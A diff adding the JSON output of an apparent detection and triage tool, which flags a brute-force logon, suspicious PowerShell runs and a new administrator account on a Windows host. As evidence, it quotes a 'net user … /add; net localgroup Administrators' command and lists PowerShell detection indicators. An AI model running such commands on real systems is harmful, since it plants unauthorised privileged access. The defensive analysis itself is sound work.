@@ -1,0 +1,3326 @@
+{
+  "data_gaps": [],
+  "device": "WIN-PC-01",
+  "evidence_files": [
+    {
+      "file": "events.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "5bb2ef933a6a07601383a4691c1a02e2537166d9c0b1e3ab446bead57ba781c8",
+      "size_bytes": 6340
+    },
+    {
+      "file": "files.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "3dd547c9bdf78683a292b660d6802b75c3e5fd24fb08d0ec7cbe2b691914c055",
+      "size_bytes": 1322
+    },
+    {
+      "file": "network.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "f9c4784fb8bda8e12258f5fc82e4c0c659c208f4d3aca43792d1037ef661ecaa",
+      "size_bytes": 2407
+    },
+    {
+      "file": "powershell.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "e78da91e113c8efad213a662ddcdae1a1e7a5af99146581e9286305cfd48525b",
+      "size_bytes": 2381
+    },
+    {
+      "file": "processes.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "fb50cfbe712e0aa51f08ec6de0274348415a95257e336a13a9ece9d203bdced8",
+      "size_bytes": 5102
+    },
+    {
+      "file": "system.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "864415958859c25641457ea0e94ccef4a242cf0afd033823a8e1dd9c1c1318f8",
+      "size_bytes": 630
+    },
+    {
+      "file": "users.json",
+      "read_and_hashed_during_validation": true,
+      "sha256": "cac941a2dd2870a02933cf554257b31193679b3981043944746fcf025ae94077",
+      "size_bytes": 2331
+    }
+  ],
+  "evidence_integrity": [],
+  "finding_assessments": [
+    {
+      "finding_id": "F-001",
+      "inference": {
+        "assessment": "Rule conditions matched; analyst review is required. This is not proof of malicious activity.",
+        "confidence": "Medium",
+        "mitre_technique_ids": [
+          "T1110.001"
+        ],
+        "severity": "High"
+      },
+      "observed_facts": {
+        "description": "6 failed logons for account 'ahmed' from 198.51.100.23 on WIN-PC-01 between 2026-10-08T07:31:02Z and 2026-10-08T07:32:08Z (66 s; threshold 5 within 120 s). A successful logon for the same account from the same source followed 32 s after the last failure.",
+        "evidence_record_ids": [
+          "EVL-0004",
+          "EVL-0005",
+          "EVL-0006",
+          "EVL-0007",
+          "EVL-0008",
+          "EVL-0009",
+          "EVL-0010"
+        ],
+        "matched_indicators": [
+          {
+            "description": "failed logons for one account from one source inside the configured window",
+            "indicator": "repeated_failed_logons",
+            "max_failures_in_window": 6,
+            "observed_failures": 6,
+            "span_seconds": 66.0,
+            "threshold": 5,
+            "window_seconds": 120
+          },
+          {
+            "description": "successful logon, same device/account/source, after the last failure",
+            "event_id": "E-00018",
+            "evidence_file": "events.json",
+            "evidence_id": "EVL-0010",
+            "indicator": "followed_by_successful_logon",
+            "seconds_after_last_failure": 32.0,
+            "success_window_seconds": 300
+          }
+        ],
+        "rule_id": "DET-001",
+        "rule_name": "Possible Brute-Force Logon Attempts",
+        "supporting_event_ids": [
+          "E-00011",
+          "E-00012",
+          "E-00013",
+          "E-00014",
+          "E-00015",
+          "E-00016",
+          "E-00018"
+        ]
+      },
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ]
+    },
+    {
+      "finding_id": "F-002",
+      "inference": {
+        "assessment": "Rule conditions matched; analyst review is required. This is not proof of malicious activity.",
+        "confidence": "High",
+        "mitre_technique_ids": [
+          "T1027.010",
+          "T1059.001",
+          "T1105"
+        ],
+        "severity": "High"
+      },
+      "observed_facts": {
+        "description": "PowerShell process PID 6012 on WIN-PC-01 (user ahmed) matched 6 configured indicators: encoded_command, hidden_window, execution_policy_bypass, download_cradle, unusual_parent, user_writable_script_path. Indicators are heuristics, not proof of malicious intent.",
+        "evidence_record_ids": [
+          "PROC-0006",
+          "PS-0002",
+          "USR-0003"
+        ],
+        "matched_indicators": [
+          {
+            "description": "command line passes a Base64-encoded command",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "command_line",
+            "indicator": "encoded_command",
+            "matched_text": "-EncodedCommand <Base64, 456 characters>"
+          },
+          {
+            "description": "command line passes a Base64-encoded command",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "host_application",
+            "indicator": "encoded_command",
+            "matched_text": "-EncodedCommand <Base64, 456 characters>"
+          },
+          {
+            "description": "PowerShell started with a hidden window",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "command_line",
+            "indicator": "hidden_window",
+            "matched_text": "-WindowStyle Hidden"
+          },
+          {
+            "description": "PowerShell started with a hidden window",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "host_application",
+            "indicator": "hidden_window",
+            "matched_text": "-WindowStyle Hidden"
+          },
+          {
+            "description": "execution policy bypassed for this session",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "command_line",
+            "indicator": "execution_policy_bypass",
+            "matched_text": "-ExecutionPolicy Bypass"
+          },
+          {
+            "description": "execution policy bypassed for this session",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "host_application",
+            "indicator": "execution_policy_bypass",
+            "matched_text": "-ExecutionPolicy Bypass"
+          },
+          {
+            "description": "script text uses a download function",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "command_line (decoded)",
+            "indicator": "download_cradle",
+            "matched_text": "Invoke-WebRequest"
+          },
+          {
+            "description": "script text uses a download function",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "command",
+            "indicator": "download_cradle",
+            "matched_text": "Invoke-WebRequest"
+          },
+          {
+            "description": "script text uses a download function",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "host_application (decoded)",
+            "indicator": "download_cradle",
+            "matched_text": "Invoke-WebRequest"
+          },
+          {
+            "description": "PowerShell was started by a process that does not normally start it",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "parent_name",
+            "indicator": "unusual_parent",
+            "matched_text": "wscript.exe"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00022",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0006",
+            "field": "command_line (decoded)",
+            "indicator": "user_writable_script_path",
+            "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "command",
+            "indicator": "user_writable_script_path",
+            "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00023",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0002",
+            "field": "host_application (decoded)",
+            "indicator": "user_writable_script_path",
+            "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+          }
+        ],
+        "rule_id": "DET-002",
+        "rule_name": "Suspicious PowerShell Activity",
+        "supporting_event_ids": [
+          "E-00022",
+          "E-00023"
+        ]
+      },
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ]
+    },
+    {
+      "finding_id": "F-003",
+      "inference": {
+        "assessment": "Rule conditions matched; analyst review is required. This is not proof of malicious activity.",
+        "confidence": "Medium",
+        "mitre_technique_ids": [
+          "T1059.001"
+        ],
+        "severity": "High"
+      },
+      "observed_facts": {
+        "description": "PowerShell process PID 6188 on WIN-PC-01 (user ahmed) matched 2 configured indicators: execution_policy_bypass, user_writable_script_path. Indicators are heuristics, not proof of malicious intent.",
+        "evidence_record_ids": [
+          "PROC-0007",
+          "PS-0003",
+          "USR-0003"
+        ],
+        "matched_indicators": [
+          {
+            "description": "execution policy bypassed for this session",
+            "event_id": "E-00026",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0007",
+            "field": "command_line",
+            "indicator": "execution_policy_bypass",
+            "matched_text": "-ExecutionPolicy Bypass"
+          },
+          {
+            "description": "execution policy bypassed for this session",
+            "event_id": "E-00027",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0003",
+            "field": "host_application",
+            "indicator": "execution_policy_bypass",
+            "matched_text": "-ExecutionPolicy Bypass"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00026",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0007",
+            "field": "command_line",
+            "indicator": "user_writable_script_path",
+            "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00027",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0003",
+            "field": "host_application",
+            "indicator": "user_writable_script_path",
+            "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+          },
+          {
+            "description": "script located in a user-writable folder",
+            "event_id": "E-00027",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0003",
+            "field": "script_path",
+            "indicator": "user_writable_script_path",
+            "matched_text": "C:\\Users\\Public\\update_svc.ps1"
+          }
+        ],
+        "rule_id": "DET-002",
+        "rule_name": "Suspicious PowerShell Activity",
+        "supporting_event_ids": [
+          "E-00026",
+          "E-00027"
+        ]
+      },
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ]
+    },
+    {
+      "finding_id": "F-004",
+      "inference": {
+        "assessment": "Rule conditions matched; analyst review is required. This is not proof of malicious activity.",
+        "confidence": "High",
+        "mitre_technique_ids": [
+          "T1098.007",
+          "T1136.001"
+        ],
+        "severity": "High"
+      },
+      "observed_facts": {
+        "description": "Account 'svc_helpdesk' was created on WIN-PC-01 at 2026-10-08T07:35:22Z by 'ahmed'. Privileged target: yes. Context indicators matched: process_chain_linked_to_powershell_finding, actor_account_targeted_by_bruteforce.",
+        "evidence_record_ids": [
+          "EVL-0010",
+          "EVL-0011",
+          "EVL-0012",
+          "PROC-0004",
+          "PROC-0005",
+          "PROC-0006",
+          "PROC-0007",
+          "PROC-0008",
+          "PS-0003",
+          "USR-0006"
+        ],
+        "matched_indicators": [
+          {
+            "basis": "group_membership_event",
+            "description": "new account was added to a privileged group after creation",
+            "event_id": "E-00032",
+            "evidence_file": "events.json",
+            "evidence_id": "EVL-0012",
+            "group": "Administrators",
+            "indicator": "privileged_target",
+            "seconds_after_creation": 9.0
+          },
+          {
+            "basis": "users_snapshot",
+            "description": "users.json lists the new account as an administrator",
+            "evidence_file": "users.json",
+            "evidence_id": "USR-0006",
+            "groups": [
+              "Administrators"
+            ],
+            "indicator": "privileged_target",
+            "is_admin": true
+          },
+          {
+            "description": "the process that created the account descends from a process in a PowerShell finding",
+            "finding_id": "F-002",
+            "indicator": "process_chain_linked_to_powershell_finding",
+            "link_basis": "ppid -> pid, same device, bounded time window",
+            "linked_process_event_ids": [
+              "E-00022"
+            ],
+            "linked_process_evidence_ids": [
+              "PROC-0006"
+            ],
+            "rule_id": "DET-002"
+          },
+          {
+            "description": "the process that created the account descends from a process in a PowerShell finding",
+            "finding_id": "F-003",
+            "indicator": "process_chain_linked_to_powershell_finding",
+            "link_basis": "ppid -> pid, same device, bounded time window",
+            "linked_process_event_ids": [
+              "E-00026"
+            ],
+            "linked_process_evidence_ids": [
+              "PROC-0007"
+            ],
+            "rule_id": "DET-002"
+          },
+          {
+            "description": "the acting account had a brute-force finding followed by a successful logon before the creation",
+            "finding_id": "F-001",
+            "indicator": "actor_account_targeted_by_bruteforce",
+            "link_strength": "account-level (no logon-session id is available)",
+            "rule_id": "DET-001",
+            "seconds_before_creation": 162.0,
+            "successful_logon_event_id": "E-00018"
+          }
+        ],
+        "rule_id": "DET-003",
+        "rule_name": "Suspicious Account Creation",
+        "supporting_event_ids": [
+          "E-00018",
+          "E-00019",
+          "E-00021",
+          "E-00022",
+          "E-00026",
+          "E-00027",
+          "E-00029",
+          "E-00030",
+          "E-00032"
+        ]
+      },
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ]
+    }
+  ],
+  "finding_links": [
+    {
+      "event_ids": [
+        "E-00011",
+        "E-00012",
+        "E-00013",
+        "E-00014",
+        "E-00015",
+        "E-00016",
+        "E-00018"
+      ],
+      "evidence_record_ids": [
+        "EVL-0004",
+        "EVL-0005",
+        "EVL-0006",
+        "EVL-0007",
+        "EVL-0008",
+        "EVL-0009",
+        "EVL-0010"
+      ],
+      "finding_id": "F-001",
+      "ioc_ids": [
+        "IOC-001",
+        "IOC-002"
+      ],
+      "mitre_technique_ids": [
+        "T1110.001"
+      ]
+    },
+    {
+      "event_ids": [
+        "E-00022",
+        "E-00023"
+      ],
+      "evidence_record_ids": [
+        "PROC-0006",
+        "PS-0002",
+        "USR-0003"
+      ],
+      "finding_id": "F-002",
+      "ioc_ids": [
+        "IOC-002",
+        "IOC-005",
+        "IOC-006",
+        "IOC-007",
+        "IOC-008",
+        "IOC-009"
+      ],
+      "mitre_technique_ids": [
+        "T1027.010",
+        "T1059.001",
+        "T1105"
+      ]
+    },
+    {
+      "event_ids": [
+        "E-00026",
+        "E-00027"
+      ],
+      "evidence_record_ids": [
+        "PROC-0007",
+        "PS-0003",
+        "USR-0003"
+      ],
+      "finding_id": "F-003",
+      "ioc_ids": [
+        "IOC-002",
+        "IOC-005",
+        "IOC-007",
+        "IOC-008",
+        "IOC-009"
+      ],
+      "mitre_technique_ids": [
+        "T1059.001"
+      ]
+    },
+    {
+      "event_ids": [
+        "E-00018",
+        "E-00019",
+        "E-00021",
+        "E-00022",
+        "E-00026",
+        "E-00027",
+        "E-00029",
+        "E-00030",
+        "E-00032"
+      ],
+      "evidence_record_ids": [
+        "EVL-0010",
+        "EVL-0011",
+        "EVL-0012",
+        "PROC-0004",
+        "PROC-0005",
+        "PROC-0006",
+        "PROC-0007",
+        "PROC-0008",
+        "PS-0003",
+        "USR-0006"
+      ],
+      "finding_id": "F-004",
+      "ioc_ids": [
+        "IOC-001",
+        "IOC-002",
+        "IOC-003",
+        "IOC-004",
+        "IOC-005",
+        "IOC-006",
+        "IOC-007",
+        "IOC-008",
+        "IOC-010"
+      ],
+      "mitre_technique_ids": [
+        "T1098.007",
+        "T1136.001"
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "confidence": "Medium",
+      "confidence_factors": [
+        "6 failed logons recorded directly in the Windows Security log (threshold 5): Medium"
+      ],
+      "context": {
+        "failure_count": 6,
+        "failure_reasons": {
+          "wrong password": 6
+        },
+        "first_failure": "2026-10-08T07:31:02Z",
+        "followed_by_successful_logon": "yes",
+        "grouping": {
+          "device": "WIN-PC-01",
+          "source_ip": "198.51.100.23",
+          "target_account": "ahmed"
+        },
+        "last_failure": "2026-10-08T07:32:08Z",
+        "logon_types": [
+          "RemoteInteractive"
+        ],
+        "max_failures_in_window": 6,
+        "seconds_to_successful_logon": 32.0,
+        "source_ip_class": "documentation",
+        "span_seconds": 66.0,
+        "success_window_seconds": 300,
+        "successful_logon_event_id": "E-00018",
+        "threshold": 5,
+        "window_seconds": 120
+      },
+      "description": "6 failed logons for account 'ahmed' from 198.51.100.23 on WIN-PC-01 between 2026-10-08T07:31:02Z and 2026-10-08T07:32:08Z (66 s; threshold 5 within 120 s). A successful logon for the same account from the same source followed 32 s after the last failure.",
+      "detected_at": "2026-10-26T09:40:16.556076Z",
+      "device": "WIN-PC-01",
+      "evidence_files": [
+        "events.json"
+      ],
+      "evidence_sources": [
+        "EVL-0004",
+        "EVL-0005",
+        "EVL-0006",
+        "EVL-0007",
+        "EVL-0008",
+        "EVL-0009",
+        "EVL-0010"
+      ],
+      "finding_id": "F-001",
+      "first_seen": "2026-10-08T07:31:02Z",
+      "iocs": [
+        "IOC-001",
+        "IOC-002"
+      ],
+      "last_seen": "2026-10-08T07:32:40Z",
+      "matched_indicators": [
+        {
+          "description": "failed logons for one account from one source inside the configured window",
+          "indicator": "repeated_failed_logons",
+          "max_failures_in_window": 6,
+          "observed_failures": 6,
+          "span_seconds": 66.0,
+          "threshold": 5,
+          "window_seconds": 120
+        },
+        {
+          "description": "successful logon, same device/account/source, after the last failure",
+          "event_id": "E-00018",
+          "evidence_file": "events.json",
+          "evidence_id": "EVL-0010",
+          "indicator": "followed_by_successful_logon",
+          "seconds_after_last_failure": 32.0,
+          "success_window_seconds": 300
+        }
+      ],
+      "mitre_techniques": [
+        "T1110.001"
+      ],
+      "reason": "Threshold met: 6 failed logons (>= 5) within a 120 s window for the same device, account and source address.",
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ],
+      "rule_id": "DET-001",
+      "rule_name": "Possible Brute-Force Logon Attempts",
+      "severity": "High",
+      "severity_factors": [
+        "base level for a threshold-met failed-logon burst: Medium",
+        "+1: a successful logon for the same account from the same source followed the failures"
+      ],
+      "supporting_events": [
+        "E-00011",
+        "E-00012",
+        "E-00013",
+        "E-00014",
+        "E-00015",
+        "E-00016",
+        "E-00018"
+      ],
+      "title": "Possible Brute-Force Logon Attempts",
+      "user": "ahmed"
+    },
+    {
+      "confidence": "High",
+      "confidence_factors": [
+        "6 distinct indicator(s) matched from 2 evidence file(s) (powershell.json, processes.json): High"
+      ],
+      "context": {
+        "correlated_records": [
+          {
+            "basis": [
+              "same device",
+              "same pid 6012",
+              "within 900 s after process start",
+              "same user 'ahmed'"
+            ],
+            "event_id": "E-00023",
+            "evidence_id": "PS-0002",
+            "link": "powershell_record"
+          },
+          {
+            "basis": [
+              "same device",
+              "same pid 6012",
+              "within 900 s after process start",
+              "user not available on one side (not compared)"
+            ],
+            "event_id": "E-00025",
+            "evidence_id": "NET-0004",
+            "link": "network_connection"
+          }
+        ],
+        "correlation_window_seconds": 900,
+        "distinct_indicators": 6,
+        "evidence_files_with_indicators": [
+          "powershell.json",
+          "processes.json"
+        ],
+        "external_classes": [
+          "public"
+        ],
+        "min_indicators": 2,
+        "powershell_records_in_context": 1,
+        "process": {
+          "command_line_available": true,
+          "device": "WIN-PC-01",
+          "parent_name": "wscript.exe",
+          "pid": 6012,
+          "process_event_id": "E-00022",
+          "process_evidence_id": "PROC-0006",
+          "start": "2026-10-08T07:34:01Z"
+        }
+      },
+      "description": "PowerShell process PID 6012 on WIN-PC-01 (user ahmed) matched 6 configured indicators: encoded_command, hidden_window, execution_policy_bypass, download_cradle, unusual_parent, user_writable_script_path. Indicators are heuristics, not proof of malicious intent.",
+      "detected_at": "2026-10-26T09:40:16.556076Z",
+      "device": "WIN-PC-01",
+      "evidence_files": [
+        "powershell.json",
+        "processes.json",
+        "users.json"
+      ],
+      "evidence_sources": [
+        "PROC-0006",
+        "PS-0002",
+        "USR-0003"
+      ],
+      "finding_id": "F-002",
+      "first_seen": "2026-10-08T07:34:01Z",
+      "iocs": [
+        "IOC-002",
+        "IOC-005",
+        "IOC-006",
+        "IOC-007",
+        "IOC-008",
+        "IOC-009"
+      ],
+      "last_seen": "2026-10-08T07:34:02Z",
+      "matched_indicators": [
+        {
+          "description": "command line passes a Base64-encoded command",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line",
+          "indicator": "encoded_command",
+          "matched_text": "-EncodedCommand <Base64, 456 characters>"
+        },
+        {
+          "description": "command line passes a Base64-encoded command",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application",
+          "indicator": "encoded_command",
+          "matched_text": "-EncodedCommand <Base64, 456 characters>"
+        },
+        {
+          "description": "PowerShell started with a hidden window",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line",
+          "indicator": "hidden_window",
+          "matched_text": "-WindowStyle Hidden"
+        },
+        {
+          "description": "PowerShell started with a hidden window",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application",
+          "indicator": "hidden_window",
+          "matched_text": "-WindowStyle Hidden"
+        },
+        {
+          "description": "execution policy bypassed for this session",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line",
+          "indicator": "execution_policy_bypass",
+          "matched_text": "-ExecutionPolicy Bypass"
+        },
+        {
+          "description": "execution policy bypassed for this session",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application",
+          "indicator": "execution_policy_bypass",
+          "matched_text": "-ExecutionPolicy Bypass"
+        },
+        {
+          "description": "script text uses a download function",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line (decoded)",
+          "indicator": "download_cradle",
+          "matched_text": "Invoke-WebRequest"
+        },
+        {
+          "description": "script text uses a download function",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "command",
+          "indicator": "download_cradle",
+          "matched_text": "Invoke-WebRequest"
+        },
+        {
+          "description": "script text uses a download function",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application (decoded)",
+          "indicator": "download_cradle",
+          "matched_text": "Invoke-WebRequest"
+        },
+        {
+          "description": "PowerShell was started by a process that does not normally start it",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "parent_name",
+          "indicator": "unusual_parent",
+          "matched_text": "wscript.exe"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00022",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0006",
+          "field": "command_line (decoded)",
+          "indicator": "user_writable_script_path",
+          "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "command",
+          "indicator": "user_writable_script_path",
+          "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00023",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0002",
+          "field": "host_application (decoded)",
+          "indicator": "user_writable_script_path",
+          "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+        }
+      ],
+      "mitre_techniques": [
+        "T1027.010",
+        "T1059.001",
+        "T1105"
+      ],
+      "reason": "6 distinct indicators matched (minimum 2) for one PowerShell execution context: encoded_command, hidden_window, execution_policy_bypass, download_cradle, unusual_parent, user_writable_script_path.",
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ],
+      "rule_id": "DET-002",
+      "rule_name": "Suspicious PowerShell Activity",
+      "severity": "High",
+      "severity_factors": [
+        "base level for 6 matched indicator(s): Medium",
+        "+1: the acting account is a member of Administrators (users.json)"
+      ],
+      "supporting_events": [
+        "E-00022",
+        "E-00023"
+      ],
+      "title": "Suspicious PowerShell Activity",
+      "user": "ahmed"
+    },
+    {
+      "confidence": "Medium",
+      "confidence_factors": [
+        "2 distinct indicator(s) matched from 2 evidence file(s) (powershell.json, processes.json): Medium"
+      ],
+      "context": {
+        "correlated_records": [
+          {
+            "basis": [
+              "same device",
+              "same pid 6188",
+              "within 900 s after process start",
+              "same user 'ahmed'"
+            ],
+            "event_id": "E-00027",
+            "evidence_id": "PS-0003",
+            "link": "powershell_record"
+          },
+          {
+            "basis": [
+              "same device",
+              "same pid 6188",
+              "within 900 s after process start",
+              "user not available on one side (not compared)"
+            ],
+            "event_id": "E-00028",
+            "evidence_id": "NET-0005",
+            "link": "network_connection"
+          }
+        ],
+        "correlation_window_seconds": 900,
+        "distinct_indicators": 2,
+        "evidence_files_with_indicators": [
+          "powershell.json",
+          "processes.json"
+        ],
+        "external_classes": [
+          "public"
+        ],
+        "min_indicators": 2,
+        "powershell_records_in_context": 1,
+        "process": {
+          "command_line_available": true,
+          "device": "WIN-PC-01",
+          "parent_name": "powershell.exe",
+          "pid": 6188,
+          "process_event_id": "E-00026",
+          "process_evidence_id": "PROC-0007",
+          "start": "2026-10-08T07:34:44Z"
+        }
+      },
+      "description": "PowerShell process PID 6188 on WIN-PC-01 (user ahmed) matched 2 configured indicators: execution_policy_bypass, user_writable_script_path. Indicators are heuristics, not proof of malicious intent.",
+      "detected_at": "2026-10-26T09:40:16.556076Z",
+      "device": "WIN-PC-01",
+      "evidence_files": [
+        "powershell.json",
+        "processes.json",
+        "users.json"
+      ],
+      "evidence_sources": [
+        "PROC-0007",
+        "PS-0003",
+        "USR-0003"
+      ],
+      "finding_id": "F-003",
+      "first_seen": "2026-10-08T07:34:44Z",
+      "iocs": [
+        "IOC-002",
+        "IOC-005",
+        "IOC-007",
+        "IOC-008",
+        "IOC-009"
+      ],
+      "last_seen": "2026-10-08T07:34:45Z",
+      "matched_indicators": [
+        {
+          "description": "execution policy bypassed for this session",
+          "event_id": "E-00026",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0007",
+          "field": "command_line",
+          "indicator": "execution_policy_bypass",
+          "matched_text": "-ExecutionPolicy Bypass"
+        },
+        {
+          "description": "execution policy bypassed for this session",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "host_application",
+          "indicator": "execution_policy_bypass",
+          "matched_text": "-ExecutionPolicy Bypass"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00026",
+          "evidence_file": "processes.json",
+          "evidence_id": "PROC-0007",
+          "field": "command_line",
+          "indicator": "user_writable_script_path",
+          "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "host_application",
+          "indicator": "user_writable_script_path",
+          "matched_text": "-File C:\\Users\\Public\\update_svc.ps1"
+        },
+        {
+          "description": "script located in a user-writable folder",
+          "event_id": "E-00027",
+          "evidence_file": "powershell.json",
+          "evidence_id": "PS-0003",
+          "field": "script_path",
+          "indicator": "user_writable_script_path",
+          "matched_text": "C:\\Users\\Public\\update_svc.ps1"
+        }
+      ],
+      "mitre_techniques": [
+        "T1059.001"
+      ],
+      "reason": "2 distinct indicators matched (minimum 2) for one PowerShell execution context: execution_policy_bypass, user_writable_script_path.",
+      "recommended_next_steps": [
+        "Review the cited evidence records and confirm the activity with the system owner.",
+        "Preserve the original evidence package and its manifest before making changes.",
+        "Correlate the cited events with adjacent timeline activity before assigning incident impact.",
+        "Prioritize analyst review because the rule assigned a high severity; treat this as triage priority, not proof of compromise."
+      ],
+      "rule_id": "DET-002",
+      "rule_name": "Suspicious PowerShell Activity",
+      "severity": "High",
+      "severity_factors": [
+        "base level for 2 matched indicator(s): Medium",
+        "+1: the acting account is a member of Administrators (users.json)"
+      ],
+      "supporting_events": [
+        "E-00026",
+        "E-00027"
+      ],
+      "title": "Suspicious PowerShell Activity",
+      "user": "ahmed"
+    },
+    {
+      "confidence": "High",
+      "confidence_factors": [
+        "direct 4720 event: Medium",
+        "raised to High: independent corroboration - users.json USR-0006 created_at matches the event (within 60 s)",
+        "raised to High: independent corroboration - a process/script record shows the creation command naming the target account"
+      ],
+      "context": {
+        "actor": "ahmed",
+        "context_indicators_matched": [
+          "process_chain_linked_to_powershell_finding",
+          "actor_account_targeted_by_bruteforce"
+        ],
+        "creating_evidence": [
+          {
+            "command": "net user svc_helpdesk [REDACTED] /add; net localgroup Administrators svc_helpdesk /add",
+            "event_id": "E-00027",
+            "evidence_file": "powershell.json",
+            "evidence_id": "PS-0003"
+          },
+          {
+            "command": "net.exe user svc_helpdesk [REDACTED] /add",
+            "event_id": "E-00029",
+            "evidence_file": "processes.json",
+            "evidence_id": "PROC-0008"
+          }
+        ],
+        "creation_event_id": "E-00030",
+        "device": "WIN-PC-01",
+        "linked_findings": {
+          "brute_force": [
+            "F-001"
+          ],
+          "powershell": [
+            "F-002",
+            "F-003"
+          ]
+        },
+        "min_context_indicators": 1,
+        "privileged_basis": [
+          "group_membership_event",
+          "users_snapshot"
+        ],
+        "privileged_target": "yes",
+        "require_privileged_target": true,
+        "snapshot_created_at_consistent": true,
+        "target_account": "svc_helpdesk",
+        "target_domain": "WIN-PC-01",
+        "target_enabled": true,
